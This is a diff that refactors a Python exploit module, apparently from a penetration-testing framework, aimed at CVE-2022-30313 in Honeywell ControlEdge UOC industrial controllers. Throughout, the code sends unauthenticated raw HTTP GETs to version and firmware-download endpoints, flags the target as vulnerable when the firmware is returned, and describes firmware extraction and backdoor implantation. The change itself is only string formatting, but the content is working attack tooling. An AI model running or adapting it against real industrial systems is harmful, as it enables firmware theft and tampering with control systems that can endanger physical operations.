@@ -47,11 +47,11 @@ _FW_VERSION_ENDPOINT = "/api/system/version"
 def _http_get(target: str, port: int, path: str, timeout: int) -> tuple:
     """Perform a minimal raw HTTP GET and return (status_code, body_bytes)."""
     request = (
-        "GET {} HTTP/1.0\r\n"
-        "Host: {}\r\n"
+        f"GET {path} HTTP/1.0\r\n"
+        f"Host: {target}\r\n"
         "Connection: close\r\n"
         "\r\n"
-    ).format(path, target).encode()
+    ).encode()
 
     try:
         sock = socket.create_connection((target, port), timeout=timeout)
@@ -137,28 +137,24 @@ class Exploit(Exploit):
         if self.simulate:
             DestructiveGate.print_simulation(
                 description=(
-                    "Would send unauthenticated HTTP GET to {}:{}{} on a Honeywell "
+                    f"Would send unauthenticated HTTP GET to {self.target}:{self.port}{_FW_ENDPOINT} on a Honeywell "
                     "ControlEdge UOC. CVE-2022-30313 (CVSS 9.1, OT:ICEFALL) — no "
                     "credentials required to access firmware download/upload endpoints. "
                     "Full firmware extraction enables reverse engineering of control logic "
-                    "and persistent backdoor implantation via modified firmware upload.".format(
-                        self.target, self.port, _FW_ENDPOINT
-                    )
+                    "and persistent backdoor implantation via modified firmware upload."
                 ),
                 payload_hex=(
-                    "GET {} HTTP/1.0\\r\\n"
-                    "Host: {}\\r\\n\\r\\n".format(_FW_ENDPOINT, self.target)
+                    f"GET {_FW_ENDPOINT} HTTP/1.0\\r\\n"
+                    f"Host: {self.target}\\r\\n\\r\\n"
                 ),
                 payload_human=(
-                    "HTTP GET {} (unauthenticated) -> firmware binary".format(_FW_ENDPOINT)
+                    f"HTTP GET {_FW_ENDPOINT} (unauthenticated) -> firmware binary"
                 ),
                 mitre_techniques=["T1693", "T0826"],
             )
             return
 
-        print_status("[CVE-2022-30313] Probing version endpoint on {}:{}...".format(
-            self.target, self.port
-        ))
+        print_status(f"[CVE-2022-30313] Probing version endpoint on {self.target}:{self.port}...")
         code, body = _http_get(self.target, self.port, _FW_VERSION_ENDPOINT, self.timeout)
         if code == 200:
             print_success(
@@ -167,16 +163,16 @@ class Exploit(Exploit):
             )
             preview = body[:200].decode("utf-8", errors="replace").strip()
             if preview:
-                print_info("[CVE-2022-30313] Version response: {}".format(preview))
+                print_info(f"[CVE-2022-30313] Version response: {preview}")
         elif code > 0:
-            print_info("[CVE-2022-30313] Version endpoint returned HTTP {}.".format(code))
+            print_info(f"[CVE-2022-30313] Version endpoint returned HTTP {code}.")
 
         print_status("[CVE-2022-30313] Probing firmware download endpoint...")
         fw_code, fw_body = _http_get(self.target, self.port, _FW_ENDPOINT, self.timeout)
         if fw_code == 200:
             print_success(
                 "[CVE-2022-30313] VULNERABLE: Firmware endpoint returned HTTP 200 "
-                "without authentication! ({} bytes)".format(len(fw_body))
+                f"without authentication! ({len(fw_body)} bytes)"
             )
             print_warning(
                 "[CVE-2022-30313] Full firmware is downloadable without credentials. "
@@ -187,4 +183,4 @@ class Exploit(Exploit):
         elif fw_code == 404:
             print_info("[CVE-2022-30313] HTTP 404 — endpoint not found. Target may not be ControlEdge.")
         else:
-            print_error("[CVE-2022-30313] Unexpected response code {}.".format(fw_code))
+            print_error(f"[CVE-2022-30313] Unexpected response code {fw_code}.")
